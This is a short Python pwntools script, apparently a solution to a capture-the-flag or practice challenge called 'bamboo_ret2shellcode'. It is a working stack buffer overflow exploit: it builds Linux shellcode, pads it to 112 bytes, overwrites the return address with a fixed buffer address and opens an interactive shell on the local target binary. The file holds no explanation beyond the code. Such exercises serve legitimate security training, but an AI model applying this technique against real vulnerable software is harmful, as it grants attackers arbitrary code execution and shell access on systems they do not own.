#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process('./bamboo_ret2shellcode')
# shellcode = asm(shellcraft.i386.linux.sh())
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

p.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
p.interactive()

